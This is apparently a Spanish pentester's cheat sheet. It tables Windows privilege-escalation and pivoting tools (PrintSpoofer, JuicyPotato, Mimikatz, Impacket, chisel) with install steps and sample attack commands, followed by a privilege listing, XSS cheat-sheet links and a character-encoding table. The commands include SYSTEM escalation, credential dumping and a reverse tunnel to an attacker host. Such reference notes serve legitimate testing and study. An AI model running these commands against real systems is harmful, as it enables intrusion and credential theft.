# Tabla de Herramientas de Post-Explotación y Pivoting

| Herramienta | Descripción | Tipo de Herramienta | Sistema de instalación | Instalación | Ejemplo de Uso Realista | Privilegios requeridos |
|-------------|-------------|---------------------|------------------------|-------------|-------------------------|------------------------|
| **PrintSpoofer.exe / PrintSpoofer64.exe** | Abusa del servicio `Print Spooler` y el permiso `SeImpersonatePrivilege` para escalar a SYSTEM. | Escalación de privilegios local | Windows | Descargar desde repositorios públicos (ej. GitHub) o compilar en Visual Studio. | `PrintSpoofer64.exe -i -c cmd.exe` (Abre shell como SYSTEM) | Usuario con `SeImpersonatePrivilege` habilitado. |
| **JuicyPotato.exe** | Variante de exploit que abusa de COM y permisos especiales para escalar a SYSTEM. | Escalación de privilegios local | Windows | Descargar binario o compilar desde código fuente. | `JuicyPotato.exe -l 1337 -p cmd.exe -t *` (Eleva a SYSTEM) | `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`. |
| **GodPotato.exe / GodPotato-NEI2.exe** | Variante mejorada de JuicyPotato que funciona en versiones más recientes de Windows. | Escalación de privilegios local | Windows | Descargar binario listo desde GitHub. | `GodPotato.exe -cmd "cmd /c whoami"` | `SeImpersonatePrivilege`. |
| **RogueWinRM.exe** | Permite ejecutar comandos remotos como SYSTEM a través de WinRM cuando se tienen privilegios. | Ejecución remota | Windows | Descargar binario desde GitHub o compilar. | `RogueWinRM.exe -H <victima_ip> -u usuario -p contraseña -c "powershell.exe"` | WinRM habilitado y credenciales válidas. |
| **sh6789.exe** | Script/binario personalizado para ejecución de payloads en Windows. | Ejecución de payloads | Windows | Copiar en la máquina víctima. | `sh6789.exe` | Depende del payload; normalmente requiere ejecución local. |
| **BloodHound** | Herramienta de análisis de Active Directory que permite descubrir rutas de ataque. | Reconocimiento y escalación lateral | Windows/Linux | Instalar desde GitHub (`npm install` para interfaz gráfica, `SharpHound` para recolección). | `SharpHound.exe -c All` y luego analizar con GUI. | Usuario con acceso al dominio. |
| **Mimikatz** | Extrae credenciales en texto plano, hashes y tickets Kerberos desde memoria. | Post-explotación / extracción de credenciales | Windows | Descargar desde GitHub o binarios precompilados. | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"` | Usuario con privilegio `SeDebugPrivilege` (normalmente admin local). |
| **Impacket** | Conjunto de scripts Python para interactuar con protocolos de red (SMB, RDP, etc.). | Post-explotación / movimiento lateral | Linux | `pip install impacket` | `psexec.py usuario@victima` | Credenciales válidas y acceso a puertos necesarios. |
| **Kerbrute** | Fuerza bruta o enumera usuarios en Kerberos. | Reconocimiento | Windows/Linux | Descargar desde GitHub (Go) o binario precompilado. | `kerbrute userenum -d dominio.local users.txt` | No requiere privilegios especiales; solo acceso a KDC (puerto 88). |
| **CrackMapExec (CME)** | Automatiza pruebas en redes Windows (SMB, WinRM, RDP). | Post-explotación / movimiento lateral | Linux | `pipx install crackmapexec` | `cme smb 192.168.1.0/24 -u usuario -p contraseña` | Credenciales válidas. |
| **smbclient** | Cliente SMB para acceder a recursos compartidos. | Acceso a compartidos SMB | Linux | `sudo apt install smbclient` | `smbclient //192.168.1.10/compartido -U usuario` | Credenciales válidas o acceso anónimo. |
| **rpcclient** | Cliente RPC para consultar información de Windows. | Enumeración | Linux | `sudo apt install samba-common-bin` | `rpcclient -U "" -N 192.168.1.10` | Acceso anónimo o credenciales válidas. |
| **proxychains** | Encadena conexiones a través de proxies/Tor. | Pivoting / tunneling | Linux | `sudo apt install proxychains` | `proxychains nmap -Pn 10.10.10.10` | No requiere privilegios especiales. |
| **chisel** | Túnel TCP/UDP rápido sobre HTTP. | Pivoting / tunneling | Windows/Linux | Descargar desde GitHub o binario precompilado. | `chisel server -p 8000 --reverse` (atacante) y `chisel client atacante_ip:8000 R:8080:127.0.0.1:80` (víctima) | Ejecución en ambos extremos; no requiere privilegios especiales. |




Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session 







https://portswigger.net/web-security/cross-site-scripting/cheat-sheet





https://github.com/s0md3v/AwesomeXSS




https://portswigger.net/web-security/cross-site-scripting/cheat-sheet


### Awesome Encoding

|HTML|Char|Numeric|Description|Hex|CSS (ISO)|JS (Octal)|URL|
|----|----|-------|-----------|----|--------|----------|---|
|`&quot;`|"|`&#34;`|quotation mark|u+0022|\0022|\42|%22|
|`&num;`|#|`&#35;`|number sign|u+0023|\0023|\43|%23|
|`&dollar;`|$|`&#36;`|dollar sign|u+0024|\0024|\44|%24|
|`&percnt;`|%|`&#37;`|percent sign|u+0025|\0025|\45|%25|
|`&amp;`|&|`&#38;`|ampersand|u+0026|\0026|\46|%26|
|`&apos;`|'|`&#39;`|apostrophe|u+0027|\0027|\47|%27|
|`&lpar;`|(|`&#40;`|left parenthesis|u+0028|\0028|\50|%28|
|`&rpar;`|)|`&#41;`|right parenthesis|u+0029|\0029|\51|%29|
|`&ast;`|*|`&#42;`|asterisk|u+002A|\002a|\52|%2A|
|`&plus;`|+|`&#43;`|plus sign|u+002B|\002b|\53|%2B|
|`&comma;`|,|`&#44;`|comma|u+002C|\002c|\54|%2C|
|`&minus;`|-|`&#45;`|hyphen-minus|u+002D|\002d|\55|%2D|
|`&period;`|.|`&#46;`|full stop; period|u+002E|\002e|\56|%2E|
|`&sol;`|/|`&#47;`|solidus; slash|u+002F|\002f|\57|%2F|
|`&colon;`|:|`&#58;`|colon|u+003A|\003a|\72|%3A|
|`&semi;`|;|`&#59;`|semicolon|u+003B|\003b|\73|%3B|
|`&lt;`|<|`&#60;`|less-than|u+003C|\003c|\74|%3C|
|`&equals;`|=|`&#61;`|equals|u+003D|\003d|\75|%3D|
|`&gt;`|>|`&#62;`|greater-than sign|u+003E|\003e|\76|%3E|
|`&quest;`|?|`&#63;`|question mark|u+003F|\003f|\77|%3F|
|`&commat;`|@|`&#64;`|at sign; commercial at|u+0040|\0040|\100|%40|
|`&lsqb;`|\[|`&#91;`|left square bracket|u+005B|\005b|\133|%5B|
|`&bsol;`|&bsol;|`&#92;`|backslash|u+005C|\005c|\134|%5C|
|`&rsqb;`|]|`&#93;`|right square bracket|u+005D|\005d|\135|%5D|
|`&Hat;`|^|`&#94;`|circumflex accent|u+005E|\005e|\136|%5E|
|`&lowbar;`|_|`&#95;`|low line|u+005F|\005f|\137|%5F|
|`&grave;`|\`|`&#96;`|grave accent|u+0060|\0060|\u0060|%60|
|`&lcub;`|{|`&#123;`|left curly bracket|u+007b|\007b|\173|%7b|
|`&verbar;`|\||`&#124;`|vertical bar|u+007c|\007c|\174|%7c|
|`&rcub;`|}|`&#125;`|right curly bracket|u+007d|\007d|\175|%7d|